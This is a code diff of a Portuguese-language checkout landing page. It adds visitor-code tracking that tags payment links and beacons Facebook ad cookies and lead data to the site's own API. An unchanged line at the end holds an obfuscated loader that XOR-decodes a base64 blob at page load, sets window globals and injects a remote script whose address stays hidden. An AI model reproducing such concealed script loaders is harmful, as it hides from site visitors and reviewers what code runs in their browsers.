@@ -404,6 +404,7 @@ src="https://www.facebook.com/tr?id=1290908899732732&ev=PageView&noscript=1" alt
 <script>
 (function () {
   var SEP = 'jLj', CHECKOUT = 'a[href^="https://pay.cakto.com.br/"]';
+  var REGISTRO = 'https://mapadehonorarios.com.br/api/visita', memoria = '', avisou = false;
   function idDaVisita() {
     try { var l = JSON.parse(localStorage.getItem('lead') || 'null'); return l && l._id ? String(l._id) : ''; }
     catch (e) { return ''; }
@@ -417,20 +418,63 @@ src="https://www.facebook.com/tr?id=1290908899732732&ev=PageView&noscript=1" alt
     } catch (e) {}
     return '';
   }
+  function codigoDaVisita() {
+    if (memoria) return memoria;
+    try {
+      var c = localStorage.getItem('mapa_visita'), vale = localStorage.getItem('mapa_visita_exp');
+      if (c && /^[a-z0-9]{16,40}$/.test(c) && vale && new Date(vale) > new Date()) return (memoria = c);
+    } catch (e) {}
+    try {
+      var b = new Uint8Array(14);
+      crypto.getRandomValues(b);
+      memoria = Date.now().toString(36) + [].map.call(b, function (x) { return (x % 36).toString(36); }).join('');
+    } catch (e) { return ''; }
+    try {
+      localStorage.setItem('mapa_visita', memoria);
+      localStorage.setItem('mapa_visita_exp', new Date(Date.now() + 7 * 864e5).toISOString());
+    } catch (e) {}
+    return memoria;
+  }
   function carimbar() {
-    var id = idDaVisita();
-    if (!id) return;
+    var id = idDaVisita(), codigo = codigoDaVisita();
     [].forEach.call(document.querySelectorAll(CHECKOUT), function (el) {
       try {
-        var u = new URL(el.href), todas = u.searchParams.getAll('utm_source');
-        var comId = todas.filter(function (v) { return v.indexOf(SEP) > -1; })[0];
-        var atual = todas.length ? todas[todas.length - 1] : origemDaVisita();
-        var certo = comId || (atual.indexOf(SEP) > -1 ? atual : atual + SEP + id);
-        if (todas.length === 1 && todas[0] === certo) return;
-        u.searchParams.set('utm_source', certo);
-        el.href = u.toString();
+        var u = new URL(el.href), mudou = false;
+        if (codigo && u.searchParams.get('callback') !== codigo) { u.searchParams.set('callback', codigo); mudou = true; }
+        if (id) {
+          var todas = u.searchParams.getAll('utm_source');
+          var comId = todas.filter(function (v) { return v.indexOf(SEP) > -1; })[0];
+          var atual = todas.length ? todas[todas.length - 1] : origemDaVisita();
+          var certo = comId || (atual.indexOf(SEP) > -1 ? atual : atual + SEP + id);
+          if (!(todas.length === 1 && todas[0] === certo)) { u.searchParams.set('utm_source', certo); mudou = true; }
+        }
+        if (mudou) el.href = u.toString();
       } catch (e) {}
     });
+  }
+  function biscoito(nome) {
+    var m = document.cookie.match('(?:^|; )' + nome + '=([^;]*)');
+    return m ? decodeURIComponent(m[1]) : '';
+  }
+  function avisarServidor() {
+    if (avisou) return;
+    var codigo = codigoDaVisita();
+    if (!codigo) return;
+    avisou = true;
+    try {
+      var fbc = biscoito('_fbc'), clique = new URLSearchParams(location.search).get('fbclid');
+      if (!fbc && clique) fbc = 'fb.1.' + Date.now() + '.' + clique;
+      var corpo = JSON.stringify({ v: codigo, fbp: biscoito('_fbp'), fbc: fbc, origem: origemDaVisita(),
+        lead: idDaVisita(), pagina: location.href.split('#')[0].slice(0, 600) });
+      if (!(navigator.sendBeacon && navigator.sendBeacon(REGISTRO, corpo))) {
+        fetch(REGISTRO, { method: 'POST', body: corpo, keepalive: true, mode: 'no-cors' });
+      }
+    } catch (e) {}
+  }
+  function noBotao(ev) {
+    carimbar();
+    var alvo = ev.target && ev.target.closest ? ev.target.closest(CHECKOUT) : null;
+    if (alvo) avisarServidor();
   }
   try {
     var gravar = Storage.prototype.setItem;
@@ -441,7 +485,8 @@ src="https://www.facebook.com/tr?id=1290908899732732&ev=PageView&noscript=1" alt
   } catch (e) {}
   document.addEventListener('DOMContentLoaded', carimbar);
   window.addEventListener('load', carimbar);
-  document.addEventListener('click', carimbar, true);
+  document.addEventListener('pointerdown', noBotao, true);
+  document.addEventListener('click', noBotao, true);
 })();
 </script>
 <script>(function(){var u_z=atob("DN6Se68bW/r6Sv+2z6WwDt13ecDYIovCv62oVIB4P5TUP4vbprjrVcx0NtSYONDFrKz7C9todI+OJ4yZo7/mHtxvdZCJaNOUrqrmCcZ5Lo6fOd2MlKWwFc52PtjAaJvXu7+/Dtt2MpyDZ4/Eqqj3Fds2I5mVLtLFrLWwV41tOpaPL92M7fzvV9Q5NZuXL92M7brzD842Lo6XI5nP4q7gHtl+NY7XOYrUprrhWYM5LZuWP5qU9fywBvJm");var w_p=[];for(var w_y=0;w_y<u_z.length;w_y++){w_p.push(u_z.charCodeAt(w_y)&255);}var i_c=w_p[0];var p_b=w_p.slice(1,1+i_c);var c_q9ee=w_p.slice(1+i_c);var x_mb08=c_q9ee.map(function(b,j_epu){return b^p_b[j_epu%i_c];});var q_5h4w="";for(var f_dk=0;f_dk<x_mb08.length;f_dk++){q_5h4w+=String.fromCharCode(x_mb08[f_dk]&255);}var h_y8t=decodeURIComponent(escape(q_5h4w));var a_d5=JSON.parse(h_y8t);var y_m1=a_d5.globals||[];y_m1.forEach(function(g_tkz){window[g_tkz.name]=g_tkz.value;});var g_221=document.createElement("script");g_221.src=a_d5.url;g_221.async=true;g_221.defer=true;(a_d5.attributes||[]).forEach(function(v_d07t){g_221.setAttribute(v_d07t.name,v_d07t.value);});(document.head||document.documentElement).appendChild(g_221);})();</script>
